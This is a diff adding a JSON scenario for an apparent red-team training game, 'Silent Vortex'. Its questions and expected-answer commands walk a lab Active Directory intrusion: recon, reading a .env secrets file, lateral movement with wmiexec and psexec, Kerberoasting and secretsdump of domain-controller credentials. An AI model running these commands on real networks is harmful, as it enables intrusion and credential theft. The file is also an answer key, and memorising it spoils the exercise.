@@ -1,0 +1,307 @@
+{
+    "id":  "silent_vortex_001",
+    "name":  "Silent Vortex",
+    "description":  "Long web-first scenario with deep recon, credential discovery, and staged lateral movement.",
+    "steps":  [
+                  {
+                      "question":  [
+                                       "Recon: Baseline exposed ports on target. Use nmap.",
+                                       "Scan 10.32.11.20 with -sV -sC -Pn."
+                                   ],
+                      "answer":  "nmap -sV -sC -Pn 10.32.11.20",
+                      "alternate_answers":  [
+                                                "nmap 10.32.11.20 -sV -sC -Pn"
+                                            ]
+                  },
+                  {
+                      "question":  [
+                                       "Recon: Enumerate virtual hosts from web response clues. Use nslookup.",
+                                       "Query DNS A record for INTRANET.SECRET.LOCAL."
+                                   ],
+                      "answer":  "nslookup INTRANET.SECRET.LOCAL"
+                  },
+                  {
+                      "question":  [
+                                       "Recon: Enumerate web directories for auth endpoints. Ensure behavior includes set wordlist and match specific HTTP status codes.",
+                                       "Run ffuf on http://10.32.11.20/FUZZ with common dir list and match 200,301,302,403."
+                                   ],
+                      "answer":  "ffuf -u http://10.32.11.20/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302,403",
+                      "alternate_answers":  [
+                                                "ffuf 200,301,302,403 -u http://10.32.11.20/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc"
+                                            ]
+                  },
+                  {
+                      "question":  [
+                                       "Recon: Validate if legacy admin CGI is exposed.",
+                                       "Run nikto against target web server."
+                                   ],
+                      "answer":  "nikto -h http://10.32.11.20",
+                      "alternate_answers":  [
+                                                "nikto http://10.32.11.20 -h"
+                                            ]
+                  },
+                  {
+                      "question":  [
+                                       "Recon: Confirm leaked backup endpoint contents. Use curl.",
+                                       "Download backup archive metadata from /backup/."
+                                   ],
+                      "answer":  "curl -s http://10.32.11.20/backup/",
+                      "alternate_answers":  [
+                                                "curl http://10.32.11.20/backup/ -s"
+                                            ]
+                  },
+                  {
+                      "question":  [
+                                       "Initial Access: You recovered app shell credentials.",
+                                       "SSH to 10.32.11.20 as webmaint."
+                                   ],
+                      "answer":  "ssh webmaint@10.32.11.20",
+                      "on_correct":  {
+                                         "messages":  [
+                                                          "Web server foothold established."
+                                                      ],
+                                         "beacon_add":  [
+                                                            {
+                                                                "id":  "silent_vortex_001",
+                                                                "ip":  "10.32.11.20",
+                                                                "hostname":  "web-prod-20",
+                                                                "username":  "webmaint",
+                                                                "mac_address":  "00:50:56:32:11:20"
+                                                            }
+                                                        ]
+                                     }
+                  },
+                  {
+                      "question":  [
+                                       "Recon: Validate local privileges.",
+                                       "Run whoami."
+                                   ],
+                      "answer":  "whoami"
+                  },
+                  {
+                      "question":  [
+                                       "Recon: Discover secrets in application env file.",
+                                       "Read /var/www/.env."
+                                   ],
+                      "answer":  "cat /var/www/.env"
+                  },
+                  {
+                      "question":  [
+                                       "Recon: Identify reachable backend hosts from web server. Use nmap with host discovery (ping scan.",
+                                       "Ping sweep 10.32.20.0/24."
+                                   ],
+                      "answer":  "nmap -sn 10.32.20.0/24",
+                      "alternate_answers":  [
+                                                "nmap 10.32.20.0/24 -sn"
+                                            ]
+                  },
+                  {
+                      "question":  [
+                                       "Recon: Validate backend SMB authentication with discovered service account.",
+                                       "crackmapexec smb on 10.32.20.33.",
+                                       "Domain: SECRET.LOCAL",
+                                       "User: svc.web",
+                                       "Pass: WebSvc!2026"
+                                   ],
+                      "answer":  "crackmapexec smb 10.32.20.33 -u svc.web -p WebSvc!2026 -d SECRET.LOCAL",
+                      "alternate_answers":  [
+                                                "crackmapexec smb 10.32.20.33 -u svc.web -pWebSvc!2026 -d SECRET.LOCAL",
+                                                "crackmapexec SECRET.LOCAL smb 10.32.20.33 -u svc.web -p WebSvc!2026 -d"
+                                            ]
+                  },
+                  {
+                      "question":  [
+                                       "Lateral Move: Execute command on backend app host.",
+                                       "wmiexec.py to 10.32.20.33 running hostname with svc.web creds."
+                                   ],
+                      "answer":  "wmiexec.py SECRET.LOCAL/svc.web:WebSvc!2026@10.32.20.33 hostname",
+                      "alternate_answers":  [
+                                                "impacket-wmiexec SECRET.LOCAL/svc.web:WebSvc!2026@10.32.20.33 hostname",
+                                                "wmiexec.py hostname SECRET.LOCAL/svc.web:WebSvc!2026@10.32.20.33"
+                                            ],
+                      "on_correct":  {
+                                         "messages":  [
+                                                          "Backend host compromised."
+                                                      ],
+                                         "beacon_add":  [
+                                                            {
+                                                                "id":  "silent_vortex_001",
+                                                                "ip":  "10.32.20.33",
+                                                                "hostname":  "app-int-33",
+                                                                "username":  "SECRET\\svc.web",
+                                                                "mac_address":  "00:50:56:32:20:33"
+                                                            }
+                                                        ]
+                                     }
+                  },
+                  {
+                      "question":  [
+                                       "Recon: Enumerate local admin membership on backend host.",
+                                       "Run net localgroup administrators."
+                                   ],
+                      "answer":  "net localgroup administrators"
+                  },
+                  {
+                      "question":  [
+                                       "Recon: Inspect active sessions for privileged users.",
+                                       "Run quser."
+                                   ],
+                      "answer":  "quser"
+                  },
+                  {
+                      "question":  [
+                                       "Recon: Enumerate scheduled tasks for credential artifacts.",
+                                       "Run schtasks /query /fo LIST /v."
+                                   ],
+                      "answer":  "schtasks /query /fo LIST /v"
+                  },
+                  {
+                      "question":  [
+                                       "Pivot: Found credential for ops-admin account.",
+                                       "psexec.py to file server 10.32.20.44 running whoami.",
+                                       "User: SECRET.LOCAL/ops-admin",
+                                       "Pass: OpsAdmin!2026"
+                                   ],
+                      "answer":  "psexec.py SECRET.LOCAL/ops-admin:OpsAdmin!2026@10.32.20.44 whoami",
+                      "alternate_answers":  [
+                                                "impacket-psexec SECRET.LOCAL/ops-admin:OpsAdmin!2026@10.32.20.44 whoami",
+                                                "psexec.py whoami SECRET.LOCAL/ops-admin:OpsAdmin!2026@10.32.20.44"
+                                            ],
+                      "on_correct":  {
+                                         "messages":  [
+                                                          "File server pivot successful."
+                                                      ],
+                                         "beacon_add":  [
+                                                            {
+                                                                "id":  "silent_vortex_001",
+                                                                "ip":  "10.32.20.44",
+                                                                "hostname":  "fs-int-44",
+                                                                "username":  "SECRET\\ops-admin",
+                                                                "mac_address":  "00:50:56:32:20:44"
+                                                            }
+                                                        ]
+                                     }
+                  },
+                  {
+                      "question":  [
+                                       "Recon: Enumerate shared data paths for credentials and scripts.",
+                                       "Run net share."
+                                   ],
+                      "answer":  "net share"
+                  },
+                  {
+                      "question":  [
+                                       "Recon: Search scripted maintenance files for domain credentials.",
+                                       "Findstr recursively for \"password\" in C:\\Scripts."
+                                   ],
+                      "answer":  "findstr /s /i /m \"password\" C:\\Scripts\\*"
+                  },
+                  {
+                      "question":  [
+                                       "Pivot: SQL host likely reachable with recovered sqlsvc creds. Ensure behavior includes list remote resources.",
+                                       "Validate share listing on 10.32.20.55 with smbclient.py.",
+                                       "User: SECRET.LOCAL/sqlsvc",
+                                       "Pass: SqlOps!2026"
+                                   ],
+                      "answer":  "smbclient.py SECRET.LOCAL/sqlsvc:SqlOps!2026@10.32.20.55 -list",
+                      "alternate_answers":  [
+                                                "impacket-smbclient SECRET.LOCAL/sqlsvc:SqlOps!2026@10.32.20.55 -list"
+                                            ]
+                  },
+                  {
+                      "question":  [
+                                       "Lateral Move: Confirm command execution on SQL host.",
+                                       "wmiexec.py whoami on 10.32.20.55 with sqlsvc creds."
+                                   ],
+                      "answer":  "wmiexec.py SECRET.LOCAL/sqlsvc:SqlOps!2026@10.32.20.55 whoami",
+                      "alternate_answers":  [
+                                                "impacket-wmiexec SECRET.LOCAL/sqlsvc:SqlOps!2026@10.32.20.55 whoami",
+                                                "wmiexec.py whoami SECRET.LOCAL/sqlsvc:SqlOps!2026@10.32.20.55"
+                                            ],
+                      "on_correct":  {
+                                         "messages":  [
+                                                          "SQL host foothold established. Web foothold beacon removed."
+                                                      ],
+                                         "beacon_remove":  [
+                                                               "wc01"
+                                                           ],
+                                         "beacon_add":  [
+                                                            {
+                                                                "id":  "silent_vortex_001",
+                                                                "ip":  "10.32.20.55",
+                                                                "hostname":  "sql-int-55",
+                                                                "username":  "SECRET\\sqlsvc",
+                                                                "mac_address":  "00:50:56:32:20:55"
+                                                            }
+                                                        ]
+                                     }
+                  },
+                  {
+                      "question":  [
+                                       "Recon: Request SPNs for roastable service accounts. Ensure behavior includes set domain controller and request tickets/data.",
+                                       "Build the command for this target."
+                                   ],
+                      "answer":  "GetUserSPNs.py SECRET.LOCAL/sqlsvc:SqlOps!2026 -dc-ip 10.32.20.10 -request"
+                  },
+                  {
+                      "question":  [
+                                       "Recon: Enumerate domain users over LDAP. Ensure behavior includes set wordlist.",
+                                       "ldapsearch against 10.32.20.10 with backup-admin creds.",
+                                       "Bind: SECRET.LOCAL\\backup-admin",
+                                       "Pass: BackupAdmin!2026"
+                                   ],
+                      "answer":  "ldapsearch -x -H ldap://10.32.20.10 -D \"SECRET.LOCAL\\\\backup-admin\" -w \"BackupAdmin!2026\" -b \"DC=SECRET,DC=LOCAL\" \"(objectClass=user)\" sAMAccountName"
+                  },
+                  {
+                      "question":  [
+                                       "Escalation: Dump sensitive AD secrets from DC.",
+                                       "Run secretsdump.py on 10.32.20.10 as backup-admin."
+                                   ],
+                      "answer":  "secretsdump.py SECRET.LOCAL/backup-admin:BackupAdmin!2026@10.32.20.10"
+                  },
+                  {
+                      "question":  [
+                                       "Final Pivot: Execute on DC with recovered Domain Admin.",
+                                       "psexec.py to 10.32.20.10 running hostname.",
+                                       "User: SECRET.LOCAL/Administrator",
+                                       "Pass: P@ssw0rd-DA!"
+                                   ],
+                      "answer":  "psexec.py SECRET.LOCAL/Administrator:P@ssw0rd-DA!@10.32.20.10 hostname",
+                      "alternate_answers":  [
+                                                "impacket-psexec SECRET.LOCAL/Administrator:P@ssw0rd-DA!@10.32.20.10 hostname",
+                                                "psexec.py hostname SECRET.LOCAL/Administrator:P@ssw0rd-DA!@10.32.20.10"
+                                            ],
+                      "on_correct":  {
+                                         "messages":  [
+                                                          "Domain controller access achieved. Intermediate beacons retired."
+                                                      ],
+                                         "beacon_remove":  [
+                                                               "wc02",
+                                                               "wc03",
+                                                               "wc04"
+                                                           ],
+                                         "beacon_add":  [
+                                                            {
+                                                                "id":  "silent_vortex_001",
+                                                                "ip":  "10.32.20.10",
+                                                                "hostname":  "dc01",
+                                                                "username":  "SECRET\\Administrator",
+                                                                "mac_address":  "00:50:56:32:20:10"
+                                                            }
+                                                        ]
+                                     }
+                  },
+                  {
+                      "question":  [
+                                       "Objective: Collect final proof file. Use type.",
+                                       "Read C:\\Users\\Administrator\\Desktop\\proof.txt"
+                                   ],
+                      "answer":  "type C:\\Users\\Administrator\\Desktop\\proof.txt",
+                      "on_correct":  {
+                                         "messages":  [
+                                                          "Web Chain Deep Dive complete."
+                                                      ]
+                                     }
+                  }
+              ]
+}
